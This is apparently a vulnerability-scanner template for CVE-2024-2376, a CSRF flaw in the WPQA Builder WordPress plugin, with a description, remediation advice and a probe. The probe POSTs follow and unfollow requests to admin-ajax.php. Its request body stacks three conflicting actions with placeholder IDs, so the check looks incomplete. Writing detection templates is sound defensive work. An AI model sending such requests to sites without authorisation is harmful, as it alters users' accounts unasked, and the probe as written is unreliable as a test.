id: CVE-2024-2376

info:
  name: WPQA Builder CSRF Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  description: The WPQA Builder WordPress plugin before 6.1.1 does not have CSRF checks in some places, which could allow attackers to make logged in users perform unwanted actions via CSRF attacks.
  impact: |
    An attacker can perform unauthorized actions on behalf of a user
  remediation: |
    Update WPQA Builder plugin to the latest version to mitigate CSRF vulnerability
  reference:
    - https://wpscan.com/vulnerability/bdd2e323-d589-4050-bc27-5edd2507a818/
  tags: wpscan

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"

    body: |
      action=wpqa_follow_cat&tax_id=__CATEGORY_ID__&tax_type=cat
      action=wpqa_unfollow_cat&tax_id=__CATEGORY_ID__&tax_type=cat
      action=wpqa_unfollow_cat&tax_id=__TAG_ID__&tax_type=tag

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "Category followed"
          - "Category unfollowed"
          - "Tag unfollowed"
        part: body
